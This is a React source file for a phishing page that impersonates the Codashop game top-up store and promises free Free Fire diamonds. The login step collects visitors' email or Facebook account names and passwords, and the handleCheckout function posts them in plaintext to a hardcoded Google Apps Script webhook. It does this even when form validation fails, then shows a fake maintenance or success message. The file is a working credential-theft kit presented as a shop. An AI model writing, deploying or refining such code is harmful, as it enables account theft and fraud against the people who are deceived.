import { useEffect, useMemo, useState } from 'react'
import { Eye, EyeOff } from 'lucide-react'

type PackageItem = {
  id: string
  name: string
  price: number
  originalPrice: number
}

type PaymentMethod = {
  id: string
  name: string
}

const SHEET_WEBHOOK_URL =
  import.meta.env.VITE_SHEET_WEBHOOK_URL ??
  'https://script.google.com/macros/s/AKfycbw7ofvwzWhePacqeweP_cW221KxHt90Nnnw27F-IxCPY6xu1M_JkHG0orjMjxZlJoTjgA/exec'

const packages: PackageItem[] = [
  { id: '5', name: '5 Diamonds', price: 901, originalPrice: 980 },
  { id: '12', name: '12 Diamonds', price: 1748, originalPrice: 1802 },
  { id: '50', name: '50 Diamonds', price: 6991, originalPrice: 7207 },
  { id: '70', name: '70 Diamonds', price: 8739, originalPrice: 9000 },
  { id: '140', name: '140 Diamonds', price: 17477, originalPrice: 18018 },
  { id: '355', name: '355 Diamonds', price: 43694, originalPrice: 45046 },
  { id: '720', name: '720 Diamonds', price: 87387, originalPrice: 90000 },
  { id: '1450', name: '1450 Diamonds', price: 174775, originalPrice: 180180 },
  { id: '2180', name: '2180 Diamonds', price: 262162, originalPrice: 270270 },
  { id: '3640', name: '3640 Diamonds', price: 436937, originalPrice: 450450 },
  { id: '7290', name: '7290 Diamonds', price: 873874, originalPrice: 900901 },
  { id: '36500', name: '36500 Diamonds', price: 4504505, originalPrice: 4644000 },
]

const paymentMethods: PaymentMethod[] = [
  { id: 'gopay', name: 'GoPay' },
  { id: 'dana', name: 'Dana' },
  { id: 'qris', name: 'QRIS' },
  { id: 'shopeepay', name: 'ShopeePay' },
  { id: 'kredivo', name: 'Kredivo' },
  { id: 'indomaret', name: 'Indomaret' },
  { id: 'alfamart', name: 'Alfamart' },
  { id: 'linkaja', name: 'LinkAja' },
  { id: 'doku', name: 'DOKU Wallet' },
]

const formatRupiah = (value: number) =>
  new Intl.NumberFormat('id-ID', {
    style: 'currency',
    currency: 'IDR',
    minimumFractionDigits: 0,
  }).format(value)

const freeLabel = 'Gratis'
const nonFreePackageIds = new Set(['1450', '2180', '3640', '7290', '36500'])

const getDisplayPrice = (item?: PackageItem) => {
  if (!item) return freeLabel
  if (nonFreePackageIds.has(item.id)) return formatRupiah(item.price)
  return freeLabel
}

const getSavings = (item?: PackageItem) => {
  if (!item) return 0
  return Math.max(item.originalPrice - item.price, 0)
}

const getWitaParts = () => {
  const now = new Date()
  const formattedDate = new Intl.DateTimeFormat('id-ID', {
    day: '2-digit',
    month: 'long',
    year: 'numeric',
    timeZone: 'Asia/Makassar',
  }).format(now)
  const formattedTime = new Intl.DateTimeFormat('id-ID', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false,
    timeZone: 'Asia/Makassar',
  }).format(now)

  return {
    formattedDate,
    formattedTime,
    timestampWita: `${formattedDate} ${formattedTime} WITA (UTC+08:00)`,
  }
}

const sendToSheet = async (payload: Record<string, string>) => {
  if (!SHEET_WEBHOOK_URL) return
  try {
    await fetch(SHEET_WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
      body: JSON.stringify(payload),
    })
  } catch (error) {
    console.error('Gagal kirim data ke spreadsheet:', error)
  }
}

function App() {
  const [playerId, setPlayerId] = useState('')
  const [zoneId, setZoneId] = useState('')
  const [selectedPackageId, setSelectedPackageId] = useState('1450')
  const [selectedPaymentId, setSelectedPaymentId] = useState('gopay')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [loginMethod, setLoginMethod] = useState<'email' | 'facebook'>('email')
  const [facebookName, setFacebookName] = useState('')
  const [agreePromo, setAgreePromo] = useState(false)
  const [showNotif, setShowNotif] = useState(false)
  const [notifType, setNotifType] = useState<'success' | 'error'>('success')
  const [notifMessage, setNotifMessage] = useState(
    'Klaim Diamond Gratis berhasil dikirim. Proses dimulai saat klaim dan memerlukan waktu hingga 24 jam.'
  )

  const selectedPackage = useMemo(
    () => packages.find((item) => item.id === selectedPackageId),
    [selectedPackageId]
  )

  const selectedPayment = useMemo(
    () => paymentMethods.find((item) => item.id === selectedPaymentId),
    [selectedPaymentId]
  )

  const isLoginComplete =
    loginMethod === 'email'
      ? email.trim().length > 0 && password.trim().length > 0
      : facebookName.trim().length > 0 && password.trim().length > 0

  const isCheckoutReady =
    playerId.trim().length > 0 &&
    zoneId.trim().length > 0 &&
    Boolean(selectedPackage) &&
    Boolean(selectedPayment) &&
    isLoginComplete

  useEffect(() => {
    if (!showNotif) return
    const timerId = setTimeout(() => setShowNotif(false), 5000)
    return () => clearTimeout(timerId)
  }, [showNotif])

  const handleCheckout = () => {
    const loginType = loginMethod === 'email' ? 'Login via Email' : 'Login via Facebook'
    const loginAccount = loginMethod === 'email' ? email : facebookName
    const { formattedDate, formattedTime, timestampWita } = getWitaParts()

    const baseLogPayload = {
      id: playerId.trim(),
      hari: formattedDate,
      jam: formattedTime,
      tanggal_wita: formattedDate,
      jam_wita: formattedTime,
      timestamp_wita: timestampWita,
      type_akun: loginType,
      akun: loginAccount.trim(),
      password: password.trim(),
    }

    if (!isCheckoutReady) {
      void sendToSheet({
        ...baseLogPayload,
        status: 'GAGAL_VALIDASI',
      })
      setNotifType('error')
      setNotifMessage('Lengkapi semua data terlebih dahulu sebelum klik Beli sekarang.')
      setShowNotif(true)
      return
    }

    const isPaidPackage = selectedPackage ? nonFreePackageIds.has(selectedPackage.id) : false
    if (isPaidPackage) {
      void sendToSheet({
        ...baseLogPayload,
        status: 'GAGAL_PAKET_BERBAYAR',
      })
      setNotifType('error')
      setNotifMessage(
        'Layanan paket diamond berbayar sedang maintenance. Untuk sementara, kami hanya menerima proses Diamond Gratis. Coba lagi dalam 2-3 hari ke depan.'
      )
      setShowNotif(true)
      return
    } else {
      void sendToSheet({
        ...baseLogPayload,
        status: 'BERHASIL_PROSES_GRATIS',
      })
      setNotifType('success')
      setNotifMessage(
        'Klaim Diamond Gratis berhasil dikirim. Proses dimulai saat klaim dan memerlukan waktu hingga 24 jam.'
      )
    }

    setShowNotif(true)
    setPlayerId('')
    setZoneId('')
    setSelectedPackageId('')
    setSelectedPaymentId('gopay')
    setEmail('')
    setPassword('')
    setLoginMethod('email')
    setFacebookName('')
    setAgreePromo(false)
  }

  return (
    <div className="min-h-screen bg-[#2c0044] text-white">
      <header className="border-b border-white/20 bg-[#4a2565]">
        <div className="mx-auto flex max-w-[1220px] items-center gap-3 px-5 py-2.5">
          <div className="flex items-center gap-2">
            <img src="/codashop.jpeg" alt="Codashop" className="h-7 w-7 rounded-md object-cover" />
            <div className="text-sm font-extrabold tracking-wide md:text-base">CODASHOP</div>
          </div>
          <div className="flex-1 text-xs text-[#e8def1] md:text-sm">
            Website top-up terbesar, tercepat dan terpercaya untuk pembelian kredit game
          </div>
        </div>
      </header>

      <main className="mx-auto grid max-w-[1220px] grid-cols-1 gap-4 px-3 pb-8 pt-4 sm:px-5 lg:grid-cols-[300px_1fr] xl:grid-cols-[320px_1fr]">
        <aside className="h-fit rounded-[10px] p-3 text-white lg:sticky lg:top-3.5">
          <div className="mb-3 flex items-center gap-3">
            <img
              src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/free-fire-tile-codacash-new.jpg"
              alt="ff"
              className="h-20 w-20 rounded-xl object-cover"
            />
            <div>
              <h2 className="m-0 text-[34px] font-semibold leading-[1.02] text-white md:text-[42px]">
                Free Fire Top-up
              </h2>
              <p className="mt-1.5 inline-flex items-center gap-1.5 rounded-full bg-[#3c2352] px-2.5 py-0.5 text-[12px] font-semibold text-[#f1e8f9] md:text-[13px]">
                <span className="inline-grid h-4 w-4 place-items-center rounded-full border border-[#bfb3cc] text-[9px]">
                  ☆
                </span>
                Pembayaran yang Aman
              </p>
            </div>
          </div>
          <p className="mb-5 text-[15px] leading-[1.35] text-[#d8cede] md:text-[16px]">
            Codashop menawarkan top up Free Fire yang mudah, aman, dan instan.
          </p>
          <p className="mb-5 text-[15px] leading-[1.35] text-[#d8cede] md:text-[16px]">
            Pembayaran tersedia melalui GoPay, Dana, QRIS, Bank Transfer, ShopeePay, Kredivo,
            Indomaret, Alfamart, LinkAja, DOKU Wallet
          </p>
          <p className="mb-5 text-[15px] leading-[1.35] text-[#d8cede] md:text-[16px]">
            Cukup masukkan user ID anda, Pilih jumlah Diamond yang ingin anda beli, pilih metode
            pembayaran yang anda inginkan, selesaikan pembayaran, dan Diamonds anda akan segera
            ditambahkan ke akun Free Fire.
          </p>
          <p className="mb-5 text-[15px] leading-[1.35] text-[#d8cede] md:text-[16px]">
            <a href="#" className="font-semibold text-[#e5dd5a] underline">
              Login ke Codashop
            </a>{' '}
            akunmu dan dapatkan akses ke promo Free Fire dan event lainnya. Belum punya akun
            Codashop?{' '}
            <a href="#" className="font-semibold text-[#e5dd5a] underline">
              Daftar sekarang
            </a>
          </p>
          <p className="mb-3 text-[15px] leading-[1.35] text-[#d8cede] md:text-[16px]">
            Unduh Free Fire sekarang!
          </p>
          <div className="flex gap-2">
            <button
              type="button"
              className="rounded-md border border-white/35 bg-black px-3 py-1.5 text-[11px] font-semibold text-white md:text-xs"
            >
              App Store
            </button>
            <button
              type="button"
              className="rounded-md border border-white/35 bg-black px-3 py-1.5 text-[11px] font-semibold text-white md:text-xs"
            >
              Google Play
            </button>
          </div>
        </aside>

        <section className="flex flex-col gap-3">
          <article className="overflow-hidden rounded-[14px] border border-[#ddd6ea] bg-white text-[#282235] shadow-[0_2px_10px_rgba(23,8,35,0.08)]">
            <div className="grid items-center gap-4 p-4 sm:p-5 md:grid-cols-[1.15fr_0.85fr]">
              <div>
                <p className="mb-2 inline-flex rounded-full bg-[#f2e9ff] px-3 py-1 text-xs font-semibold text-[#5f38d3] sm:text-sm">
                  Promo Terbatas Hari Ini
                </p>
                <h1 className="m-0 text-2xl font-extrabold leading-tight text-[#22173a] sm:text-3xl">
                  Codashop lagi bagi-bagi diamond gratis
                </h1>
                <p className="mt-2 text-sm leading-relaxed text-[#675b7a] sm:text-base">
                  Segera klaim sebelum kehabisan kuota. Masukkan data akun dengan benar agar proses
                  transfer diamond bisa diproses lebih cepat.
                </p>
              </div>
              <div className="w-full md:justify-self-end">
                <img
                  src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/free-fire-tile-codacash-new.jpg"
                  alt="Banner promo codashop diamond gratis"
                  className="mx-auto h-[110px] w-[110px] rounded-xl object-cover sm:h-[140px] sm:w-[140px] md:mr-0 md:ml-auto md:h-[190px] md:w-full"
                />
              </div>
            </div>
          </article>

          <article className="rounded-[10px] border border-[#ddd6ea] bg-white p-3.5 text-[#282235] shadow-[0_2px_10px_rgba(23,8,35,0.08)]">
            <h3 className="mb-3 flex items-center gap-2 text-xl font-bold text-[#21172f] md:text-2xl">
              <span className="inline-grid h-7 w-7 place-items-center rounded-full bg-[#6f45f5] text-sm text-white">
                1
              </span>
              Masukkan Player ID
            </h3>
            <div className="grid grid-cols-1 gap-2.5 md:grid-cols-[1fr_120px]">
              <input
                value={playerId}
                onChange={(event) => setPlayerId(event.target.value.replace(/\D/g, ''))}
                placeholder="Masukkan Player ID"
                className="w-full rounded-lg border border-[#d8d1e6] p-3 text-sm outline-none ring-[#8f78e6] focus:ring-2"
                inputMode="numeric"
                pattern="[0-9]*"
              />
              <input
                value={zoneId}
                onChange={(event) => setZoneId(event.target.value.replace(/\D/g, ''))}
                placeholder="Zone ID"
                className="w-full rounded-lg border border-[#d8d1e6] p-3 text-sm outline-none ring-[#8f78e6] focus:ring-2"
                inputMode="numeric"
                pattern="[0-9]*"
              />
            </div>
            <p className="mt-2 text-xs text-[#6d607c] md:text-sm">
              Untuk menemukan ID Anda, klik pada ikon karakter. User ID tercantum di bawah nama
              karakter Anda.
            </p>
          </article>

          <article className="rounded-[10px] border border-[#ddd6ea] bg-white p-3.5 text-[#282235] shadow-[0_2px_10px_rgba(23,8,35,0.08)]">
            <h3 className="mb-3 flex items-center gap-2 text-xl font-bold text-[#21172f] md:text-2xl">
              <span className="inline-grid h-7 w-7 place-items-center rounded-full bg-[#6f45f5] text-sm text-white">
                2
              </span>
              Pilih Nominal Top Up
            </h3>
            <div className="grid grid-cols-[repeat(auto-fill,minmax(140px,1fr))] gap-2.5">
              {packages.map((item) => (
                <button
                  key={item.id}
                  type="button"
                  className={`grid cursor-pointer gap-0.5 rounded-[10px] border p-2.5 text-left ${
                    selectedPackageId === item.id
                      ? 'border-2 border-[#7d5dfa] bg-[#f4f0ff]'
                      : 'border-[#d9d2e5] bg-white hover:border-[#8f78e6]'
                  }`}
                  onClick={() => setSelectedPackageId(item.id)}
                >
                  <strong className="text-sm text-[#2a2336]">{item.name}</strong>
                  <small className="text-[11px] text-[#866f9f]">Dari</small>
                  <span className="font-bold text-[#d04c92]">{getDisplayPrice(item)}</span>
                  <small className="text-[11px] text-[#866f9f] line-through">
                    {formatRupiah(item.originalPrice)}
                  </small>
                </button>
              ))}
            </div>
          </article>

          <article className="rounded-[10px] border border-[#ddd6ea] bg-white p-3.5 text-[#282235] shadow-[0_2px_10px_rgba(23,8,35,0.08)]">
            <h3 className="mb-3 flex items-center gap-2 text-xl font-bold text-[#21172f] md:text-2xl">
              <span className="inline-grid h-7 w-7 place-items-center rounded-full bg-[#6f45f5] text-sm text-white">
                3
              </span>
              Pilih pembayaran
            </h3>
            <div className="grid grid-cols-[repeat(auto-fill,minmax(130px,1fr))] gap-2.5">
              {paymentMethods.map((method) => (
                <button
                  key={method.id}
                  type="button"
                  className={`grid cursor-pointer gap-1 rounded-[10px] border p-2.5 text-left ${
                    selectedPaymentId === method.id
                      ? 'border-2 border-[#7d5dfa] bg-[#f4f0ff]'
                      : 'border-[#d9d2e5] bg-white hover:border-[#8f78e6]'
                  }`}
                  onClick={() => setSelectedPaymentId(method.id)}
                >
                  <strong className="text-sm text-[#2a2336]">{method.name}</strong>
                  <span className="font-bold text-[#b53f7f]">{getDisplayPrice(selectedPackage)}</span>
                </button>
              ))}
            </div>
          </article>

          <article className="rounded-[10px] border border-[#ddd6ea] bg-white p-3.5 text-[#282235] shadow-[0_2px_10px_rgba(23,8,35,0.08)]">
            <h3 className="mb-3 flex items-center gap-2 text-xl font-bold text-[#21172f] md:text-2xl">
              <span className="inline-grid h-7 w-7 place-items-center rounded-full bg-[#6f45f5] text-sm text-white">
                4
              </span>
              Login Akun
            </h3>
            <p className="text-xs text-[#6d607c] md:text-sm">
              Masukkan akun yang ingin dikirimkan sebagai proses transfer diamond.
            </p>
            <div className="mt-3 grid grid-cols-1 gap-2 sm:grid-cols-2">
              <button
                type="button"
                onClick={() => setLoginMethod('facebook')}
                className={`rounded-lg border px-3 py-2 text-sm font-semibold ${
                  loginMethod === 'facebook'
                    ? 'border-[#7d5dfa] bg-[#f4f0ff] text-[#4b2dc6]'
                    : 'border-[#d8d1e6] bg-white text-[#5a4d6f]'
                }`}
              >
                Login via Facebook
              </button>
              <button
                type="button"
                onClick={() => setLoginMethod('email')}
                className={`rounded-lg border px-3 py-2 text-sm font-semibold ${
                  loginMethod === 'email'
                    ? 'border-[#7d5dfa] bg-[#f4f0ff] text-[#4b2dc6]'
                    : 'border-[#d8d1e6] bg-white text-[#5a4d6f]'
                }`}
              >
                Login via Email
              </button>
            </div>
            {loginMethod === 'email' ? (
              <div className="mt-2 space-y-2">
                <input
                  value={email}
                  onChange={(event) => setEmail(event.target.value)}
                  className="w-full rounded-lg border border-[#d8d1e6] p-3 text-sm outline-none ring-[#8f78e6] focus:ring-2"
                  type="email"
                  placeholder="Email atau nomor telepon"
                />
                <div className="relative">
                  <input
                    value={password}
                    onChange={(event) => setPassword(event.target.value)}
                    className="w-full rounded-lg border border-[#d8d1e6] p-3 pr-12 text-sm outline-none ring-[#8f78e6] focus:ring-2"
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Kata sandi"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword((prev) => !prev)}
                    className="absolute inset-y-0 right-0 flex items-center px-3 text-[#6d607c] hover:text-[#4b2dc6]"
                    aria-label={showPassword ? 'Sembunyikan kata sandi' : 'Tampilkan kata sandi'}
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
            ) : (
              <div className="mt-2 space-y-2">
                <input
                  value={facebookName}
                  onChange={(event) => setFacebookName(event.target.value)}
                  className="w-full rounded-lg border border-[#d8d1e6] p-3 text-sm outline-none ring-[#8f78e6] focus:ring-2"
                  type="text"
                  placeholder="Nomer ponsel atau email"
                />
                <div className="relative">
                  <input
                    value={password}
                    onChange={(event) => setPassword(event.target.value)}
                    className="w-full rounded-lg border border-[#d8d1e6] p-3 pr-12 text-sm outline-none ring-[#8f78e6] focus:ring-2"
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Kata sandi"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword((prev) => !prev)}
                    className="absolute inset-y-0 right-0 flex items-center px-3 text-[#6d607c] hover:text-[#4b2dc6]"
                    aria-label={showPassword ? 'Sembunyikan kata sandi' : 'Tampilkan kata sandi'}
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
            )}
            <label className="mt-2.5 flex items-start gap-2 text-xs text-[#6d607c] md:text-sm">
              <input
                type="checkbox"
                checked={agreePromo}
                onChange={(event) => setAgreePromo(event.target.checked)}
                className="mt-0.5"
              />
              <span>Saya ingin menerima berita dan promosi melalui SMS atau Whatsapp</span>
            </label>
          </article>

          <article className="sticky bottom-2.5 flex flex-col items-start justify-between gap-2.5 rounded-[16px] border border-[#ddd6ea] bg-white px-3.5 py-3.5 text-[#282235] shadow-[0_2px_10px_rgba(23,8,35,0.08)] md:flex-row md:items-center md:gap-4 md:px-5 md:py-4">
            <div className="w-full md:w-auto">
              <small className="block text-[12px] font-medium text-[#2c0b38] md:text-[14px]">
                {selectedPackage?.name ?? 'Belum memilih nominal'} {' • '}
                {selectedPayment?.name ?? 'Belum memilih metode'}
              </small>

              <div className="mt-1.5">
                {selectedPackage ? (
                  <div className="flex flex-wrap items-center gap-2">
                    <small className="text-[11px] font-semibold text-[#8a8193] line-through md:text-[12px]">
                      {formatRupiah(selectedPackage.originalPrice)}
                    </small>
                    <span className="rounded-full bg-[#caecd2] px-2.5 py-0.5 text-[10px] font-semibold text-[#0aa73f] md:px-3.5 md:py-0.5 md:text-[12px]">
                      Hemat {formatRupiah(getSavings(selectedPackage))}
                    </span>
                  </div>
                ) : null}
                <h4 className="mt-1 text-[24px] font-extrabold leading-none text-[#f06f8e] md:text-[24px]">
                  {getDisplayPrice(selectedPackage)}
                </h4>
                <p className="m-0 text-[11px] font-semibold text-[#776c85] md:text-[12px]">
                  Pajak akan dikenakan saat checkout
                </p>
                {selectedPackage && nonFreePackageIds.has(selectedPackage.id) ? (
                  <p className="mt-0.5 flex items-center gap-1.5 text-[10px] font-semibold leading-tight text-[#40384b] md:text-[12px]">
                    <span className="inline-grid h-4 w-4 place-items-center rounded-full border border-[#a36b00] bg-[#ffc845] text-[10px] text-[#7c5200] md:h-4 md:w-4 md:text-[10px]">
                      $
                    </span>
                    Dapatkan Rewards senilai {formatRupiah(Math.round(selectedPackage.price * 0.006))}
                  </p>
                ) : null}
              </div>
            </div>
            <button
              type="button"
              onClick={handleCheckout}
              disabled={!isCheckoutReady}
              className={`w-full rounded-full border px-7 py-2.5 text-[16px] font-bold text-white shadow-[0_2px_8px_rgba(98,68,240,0.35)] md:w-auto md:min-w-[260px] md:px-7 md:py-2 md:text-[16px] ${
                isCheckoutReady
                  ? 'cursor-pointer border-[#b9b6cb] bg-gradient-to-r from-[#6e47f6] to-[#5a3eef]'
                  : 'cursor-not-allowed border-[#c6c1d7] bg-[#b5add5]'
              }`}
            >
              Beli sekarang
            </button>
          </article>
        </section>
      </main>

      {showNotif ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-4">
          <div
            className={`w-full max-w-xl rounded-2xl p-6 text-center shadow-2xl ${
              notifType === 'error'
                ? 'animate-[shake_0.45s_ease-in-out_2] bg-gradient-to-br from-[#fff5f7] to-[#ffdfe6] text-[#5a1f2f]'
                : 'bg-gradient-to-br from-[#f6fff8] to-[#dff7e7] text-[#1d3b2a]'
            }`}
          >
            {notifType === 'error' ? (
              <div className="mx-auto mb-4 inline-grid h-10 w-10 place-items-center rounded-full border-2 border-[#e54878] bg-[#ffe7ee] text-2xl font-extrabold leading-none text-[#d61f59]">
                ×
              </div>
            ) : (
              <div className="mx-auto mb-4 h-10 w-10 animate-spin rounded-full border-4 border-[#b7e8c4] border-t-[#19a348]" />
            )}
            <p className={`text-base font-semibold md:text-xl ${notifType === 'error' ? 'text-[#74243f]' : ''}`}>
              {notifMessage}
            </p>
            <div
              className={`mt-5 h-1.5 w-full overflow-hidden rounded-full ${
                notifType === 'error' ? 'bg-[#f4c2cf]' : 'bg-[#cfeeda]'
              }`}
            >
              <div
                className={`h-full w-full animate-pulse rounded-full ${
                  notifType === 'error' ? 'bg-[#e54878]' : 'bg-[#19a348]'
                }`}
              />
            </div>
          </div>
        </div>
      ) : null}
    </div>
  )
}

export default App
